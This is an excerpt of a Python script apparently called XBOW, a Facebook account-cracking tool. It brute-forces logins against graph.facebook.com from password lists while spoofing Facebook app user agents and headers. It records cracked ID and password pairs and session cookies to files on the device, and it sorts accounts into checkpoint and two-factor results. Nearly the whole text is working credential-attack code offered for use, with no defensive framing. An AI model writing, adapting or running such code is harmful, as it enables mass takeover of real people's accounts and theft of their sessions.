...
def uaa():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/471.1.0.51.108;FBBV/632716929;FBDM/{density=1.4875001,width=720,height=1502};FBLC/en_US;FBCR/Banglalink;FBMF/Symphony;FBBD/Symphony;FBDV/Z60 plus;FBSV/12;FBCA/arm64-v8a:null;FB_FW/1;]"

logo=(f"""\
 __  __     ____   _____        __
\033[96;1m \ \/ /    | __ ) / _ \ \      / /
\033[96;1m  \  /_____|  _ \| | | \ \ /\ / / 
\033[97;1m  /  \_____| |_) | |_| |\ V  V /  
 /_/\_\    |____/ \___/  \_/\_/      \033[92;1m inc3
\033[1;37m----------------------------------------------
 [•] Author     :  INCEPTION👾
 [•] Github     :  inception-09
 [•] Tool       :  In Development
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [XBOW-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": useragent(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        ...
                        if 'session_key' in po:                                       
                                        ...
                                        print('\r\r\033[1;32m [XBOW-OK] '+ids+' | '+pas+' | '+coki+'\033[1;97m')
                                        open('/sdcard/XBOW-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/XBOW-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[XBOW-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
                                        sys.stdout.write('\r\r\033[1;31m [XBOW-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [XBOW-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XBOW-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/XBOW-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [XBOW-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [XBOW-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/XBOW-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/XBOW-OK.txt','a').write(ids+'|'+pas+'\n')
                                        ...
                                        sys.stdout.write('\r\r\033[1;31m [XBOW-M3] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [XBOW-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XBOW-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [XBOW-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [XBOW-OK] %s | %s'%(ids,pas))
                                open('/sdcard/XBOW-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/XBOW-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        ##########print('\r\r\x1b[38;5;208m [ZAIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XBOW-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
